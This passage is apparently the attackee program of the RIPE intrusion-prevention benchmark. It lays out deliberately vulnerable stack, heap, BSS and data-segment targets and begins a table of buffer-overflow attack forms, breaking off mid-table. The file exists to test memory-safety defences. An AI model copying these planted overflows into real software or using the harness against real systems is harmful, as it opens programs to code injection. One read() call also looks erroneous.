// gcc -static -g -o attackee-64bit attackee-64bit.c

/* RIPE was originally developed by John Wilander (@johnwilander)
 * and was debugged and extended by Nick Nikiforakis (@nicknikiforakis)
 *
 * Released under the MIT license (see file named LICENSE)
 *
 * This program is part the paper titled
 * RIPE: Runtime Intrusion Prevention Evaluator 
 * Authored by: John Wilander, Nick Nikiforakis, Yves Younan,
 *              Mariam Kamkar and Wouter Joosen
 * Published in the proceedings of ACSAC 2011, Orlando, Florida
 *
 * Please cite accordingly.
 */

#include "ripe_attack_generator.h"
#include <sys/syscall.h>

/* DATA SEGMENT TARGETS */
/* Data segment buffers to inject into                                     */
/* Two buffers declared to be able to chose buffer address without NUL     */
/* Largest buffer declared last since it'll be "after" in the data seg     */
static char data_buffer1[1] = "d";
static char data_buffer2[128] = "dummy";
/* Target: Pointer in data segment for indirect attack                     */
/* Declared after injection buffers to place it "after" in the data seg    */
static long *data_mem_ptr = 0x0;
/* Target: Function pointer in data segment                                */
/* Declared after injection buffers since it'll be "after" in the data seg */
static int (*data_func_ptr2)(const char *) = &dummy_function;
static int (*data_func_ptr1)(const char *) = &dummy_function;
 /* Target: Longjump buffer in data segment                                */
 /* Declared after injection buffers to place it "after" on the data seg   */
static jmp_buf data_jmp_buffer = {0, 0, 0, 0, 0, 0};

int fooz(char *a, int b);
static struct attackme data_struct = {"AAAAAAAAAAAA",&fooz};


//NN: Moved away of harm's way (aka overflowing buffers in the data segment)
static char loose_change1[128];			//NN Sandwich the control vars
static boolean output_error_msg = TRUE;
static boolean output_debug_info = FALSE; /* Disables most effective attacks */
static boolean has_opened_output_stream = FALSE;
static ATTACK_FORM attack;

int fooz(char *a, int b){
	int zz,ff;

	zz =a ;
	ff = b;

//	fprintf(stderr,"Fooz was called");
	return 1;
}

int input_idx = 0;
/**********/
/* MAIN() */
/**********/
int main(int argc, char **argv) {
  int option_char;
  int i = 0;
  FILE *output_stream;
  jmp_buf stack_jmp_buffer_param;

  //NN: Add provisioning for when 00 are in the address of the jmp_buffer_param
  jmp_buf stack_jmp_buffer_param_array[512];

  for(i=0; i < 512; i++){
	if(!contains_terminating_char(stack_jmp_buffer_param_array[i]))
		break;
  }
  if (i == 512){
	fprintf(stderr,"Error. Can't allocate appropriate stack_jmp_buffer\n");
	exit(1);
  }


  /* If no output option set default */
  if(!has_opened_output_stream && output_debug_info) {
    //    output_stream = stdout;
    output_stream = fopen(DEBUG_MEMDUMP, "a+");
    if(output_stream == NULL) {
      if(output_error_msg) {
	fprintf(stderr, "Error: Could not open file \"debug.txt\"\n");
      }
    } else {
      has_opened_output_stream = TRUE;
    }
  }

  perform_attack(output_stream, &dummy_function, stack_jmp_buffer_param_array[i]);

  printf("done!\n");
}

void* get_payload_buffer()
{
  char* a = (char*)malloc(1024);
  return a;
}
size_t get_payload_size(char* a)
{
  return read(SYS_read, 0, a, 1024);
}

/********************/
/* PERFORM_ATTACK() */
/********************/
void perform_attack(FILE *output_stream,
		    int (*stack_func_ptr_param)(const char *),
		    jmp_buf stack_jmp_buffer_param) {

  /* STACK TARGETS */
  /* Target: Longjump buffer on stack                                       */
  /* Declared before injection buffers to place it "below" on the stack     */
  jmp_buf stack_jmp_buffer;
  /* Target: Function pointer on stack                                      */
  /* Declared before injection buffers to place it "below" on the stack     */
  int (*stack_func_ptr)(const char *);
  /* Target: Pointer on stack for indirect attack                           */
  /* Declared before injection buffers to place it "below" on the stack     */
  /* Declared adjacent to the injection buffers, at the top of the stack,   */
  /* so an indirect attack won't overflow the stack target code pointers    */
  /* when overflowing the indirect pointer                                  */
  long *stack_mem_ptr;
  /* Stack buffers to inject into                                           */
  /* Two buffers declared to be able to chose buffer address without NUL    */
  /* Largest buffer declared first since it'll be "below" on the stack      */
 // char stack_buffer1[128];
 // char stack_buffer2[1];

  char stack_buffer[1024];
  //JMP_BUF for indirect attacks
  jmp_buf stack_jmp_buffer_indirect[512];
  struct attackme stack_struct;
  stack_struct.func_ptr = fooz;

 

  /* HEAP TARGETS */
  /* Heap buffers to inject into                                            */
  /* Two buffers declared to be able to chose buffer that gets allocated    */
  /* first on the heap. The other buffer will be set as a target, i.e. a    */
  /* heap array of function pointers.                                       */
  char *heap_buffer1 = (char *)malloc(128 + sizeof(long));
  char *heap_buffer2 = (char *)malloc(128 + sizeof(long));
  char *heap_buffer3 = (char *)malloc(128 + sizeof(long));
  /* Target: Pointer on heap for indirect attack                            */
  /* Declared after injection buffers to place it "after" on the heap       */
  long *heap_mem_ptr;
  /* Target: Function pointer on heap                                       */
  /* This pointer is set by collecting a pointer value in the function      */
  /* pointer array.                                                         */
  int (**heap_func_ptr)(const char *) = 0;
  /* Target: Longjmp buffer on the heap                                     */
  /* Declared after injection buffers to place it "after" on the heap       */
  //jmp_buf heap_jmp_buffer;
   jmp_buf *heap_jmp_buffer; //NN Here it is just a pointer...

  struct attackme *heap_struct = (struct attackme*)malloc(sizeof(struct attackme));
  heap_struct->func_ptr = fooz;


  /* BSS TARGETS */
  /* Target: Pointer in BSS segment for indirect attack                     */
  /* Declared after injection buffers to place it "after" in the BSS seg    */
  static long bss_dummy_value;
  /* Target: Function pointer in BSS segment                                */
  /* Declared after injection buffers to place it "after" in the BSS seg    */
  static int (*bss_func_ptr)(const char *);
  /* Target: Longjmp buffer in BSS segment                                  */
  /* Declared after injection buffers to place it "after" in the BSS seg    */
  static jmp_buf bss_jmp_buffer;
  static long *bss_mem_ptr;
  static char placeholder[128]; //NN provide enough space for shellcode
  /* BSS buffers to inject into                                             */
  /* Two buffers declared to be able to chose buffer address without NUL    */
  /* Largest buffer declared last since it'll be "after" in the BSS seg     */
  static char bss_buffer1[1];
  static char bss_buffer2[128];
  static jmp_buf bss_jmp_buffer_indirect;

  static struct attackme bss_struct;
  

  /* Pointer to buffer to overflow */
  char *buffer, *dump_start_addr;
  /* Address to target for direct (part of) overflow */
  void *target_addr;
  /* Buffer for storing a generated format string */
  char format_string_buf[16];
  /* Temporary storage of payload for overflow with fscanf() */
  FILE *fscanf_temp_file;
  CHARPAYLOAD payload;

  /* Storage of debug memory dumps (used for debug output) */
  MEM_DUMP mem_dump1[DEFAULT_DUMP_SIZE];
  MEM_DUMP mem_dump2[DEFAULT_DUMP_SIZE];
  MEM_DUMP payload_dump[DEFAULT_DUMP_SIZE];

  if(output_debug_info) {
    dump_start_addr = format_string_buf;
  } /* DEBUG */

  /* Check that malloc went fine */
  if(heap_buffer1 == NULL || heap_buffer2 == NULL) {
    perror("Unable to allocate heap memory.");
    exit(1);
  }

  /* Initialize function pointers to point to dummy function so    */
  /* that if the attack fails there will still be code to execute  */
  stack_func_ptr = &dummy_function;
  //  heap_func_ptr = &dummy_function;
  bss_func_ptr = &dummy_function;

  /***************************************/
  /* Set location for buffer to overflow */
  /***************************************/
  ATTACK_FORM attacks[] = {
    {DIRECT, INJECTED_CODE_NO_NOP, RET_ADDR, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, RET_ADDR, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, RET_ADDR, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, RET_ADDR, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, RET_ADDR, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, RET_ADDR, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, RET_ADDR, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, RET_ADDR, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, RET_ADDR, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, RET_ADDR, STACK, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_NO_NOP, OLD_BASE_PTR, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, OLD_BASE_PTR, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, OLD_BASE_PTR, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, OLD_BASE_PTR, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, OLD_BASE_PTR, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, OLD_BASE_PTR, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, OLD_BASE_PTR, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, OLD_BASE_PTR, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, OLD_BASE_PTR, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, OLD_BASE_PTR, STACK, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_VAR, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_VAR, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_VAR, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_VAR, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_VAR, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_VAR, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_VAR, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_VAR, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_VAR, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_VAR, STACK, HOMEBREW},

    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_PARAM, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_PARAM, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_PARAM, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_PARAM, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_PARAM, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_PARAM, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_PARAM, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_PARAM, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_PARAM, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_STACK_PARAM, STACK, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_HEAP, HEAP, MEMCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_HEAP, HEAP, STRCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_HEAP, HEAP, STRNCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_HEAP, HEAP, SPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_HEAP, HEAP, SNPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_HEAP, HEAP, STRCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_HEAP, HEAP, STRNCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_HEAP, HEAP, SSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_HEAP, HEAP, FSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_HEAP, HEAP, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_BSS, BSS, MEMCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_BSS, BSS, STRCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_BSS, BSS, STRNCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_BSS, BSS, SPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_BSS, BSS, SNPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_BSS, BSS, STRCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_BSS, BSS, STRNCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_BSS, BSS, SSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_BSS, BSS, FSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_BSS, BSS, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_DATA, DATA, MEMCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_DATA, DATA, STRCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_DATA, DATA, STRNCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_DATA, DATA, SPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_DATA, DATA, SNPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_DATA, DATA, STRCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_DATA, DATA, STRNCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_DATA, DATA, SSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_DATA, DATA, FSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, FUNC_PTR_DATA, DATA, HOMEBREW},

    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_VAR, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_VAR, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_VAR, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_VAR, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_VAR, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_VAR, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_VAR, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_VAR, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_VAR, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_VAR, STACK, HOMEBREW},

    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_PARAM, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_PARAM, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_PARAM, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_PARAM, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_PARAM, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_PARAM, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_PARAM, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_PARAM, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_PARAM, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_STACK_PARAM, STACK, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_HEAP, HEAP, MEMCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_HEAP, HEAP, STRCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_HEAP, HEAP, STRNCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_HEAP, HEAP, SPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_HEAP, HEAP, SNPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_HEAP, HEAP, STRCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_HEAP, HEAP, STRNCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_HEAP, HEAP, SSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_HEAP, HEAP, FSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_HEAP, HEAP, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_BSS, BSS, MEMCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_BSS, BSS, STRCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_BSS, BSS, STRNCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_BSS, BSS, SPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_BSS, BSS, SNPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_BSS, BSS, STRCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_BSS, BSS, STRNCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_BSS, BSS, SSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_BSS, BSS, FSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_BSS, BSS, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_DATA, DATA, MEMCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_DATA, DATA, STRCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_DATA, DATA, STRNCPY},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_DATA, DATA, SPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_DATA, DATA, SNPRINTF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_DATA, DATA, STRCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_DATA, DATA, STRNCAT},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_DATA, DATA, SSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_DATA, DATA, FSCANF},
    {DIRECT, INJECTED_CODE_NO_NOP, LONGJMP_BUF_DATA, DATA, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, RET_ADDR, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, RET_ADDR, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, RET_ADDR, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, RET_ADDR, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, RET_ADDR, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, RET_ADDR, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, RET_ADDR, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, RET_ADDR, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, RET_ADDR, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, RET_ADDR, STACK, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, OLD_BASE_PTR, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, OLD_BASE_PTR, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, OLD_BASE_PTR, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, OLD_BASE_PTR, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, OLD_BASE_PTR, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, OLD_BASE_PTR, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, OLD_BASE_PTR, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, OLD_BASE_PTR, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, OLD_BASE_PTR, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, OLD_BASE_PTR, STACK, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_VAR, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_VAR, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_VAR, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_VAR, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_VAR, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_VAR, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_VAR, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_VAR, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_VAR, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_VAR, STACK, HOMEBREW},

    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_PARAM, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_PARAM, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_PARAM, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_PARAM, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_PARAM, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_PARAM, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_PARAM, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_PARAM, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_PARAM, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_STACK_PARAM, STACK, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_HEAP, HEAP, MEMCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_HEAP, HEAP, STRCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_HEAP, HEAP, STRNCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_HEAP, HEAP, SPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_HEAP, HEAP, SNPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_HEAP, HEAP, STRCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_HEAP, HEAP, STRNCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_HEAP, HEAP, SSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_HEAP, HEAP, FSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_HEAP, HEAP, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_BSS, BSS, MEMCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_BSS, BSS, STRCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_BSS, BSS, STRNCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_BSS, BSS, SPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_BSS, BSS, SNPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_BSS, BSS, STRCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_BSS, BSS, STRNCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_BSS, BSS, SSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_BSS, BSS, FSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_BSS, BSS, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_DATA, DATA, MEMCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_DATA, DATA, STRCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_DATA, DATA, STRNCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_DATA, DATA, SPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_DATA, DATA, SNPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_DATA, DATA, STRCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_DATA, DATA, STRNCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_DATA, DATA, SSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_DATA, DATA, FSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, FUNC_PTR_DATA, DATA, HOMEBREW},

    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_VAR, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_VAR, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_VAR, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_VAR, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_VAR, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_VAR, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_VAR, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_VAR, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_VAR, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_VAR, STACK, HOMEBREW},

    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_PARAM, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_PARAM, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_PARAM, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_PARAM, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_PARAM, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_PARAM, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_PARAM, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_PARAM, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_PARAM, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_STACK_PARAM, STACK, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_HEAP, HEAP, MEMCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_HEAP, HEAP, STRCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_HEAP, HEAP, STRNCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_HEAP, HEAP, SPRINTF},
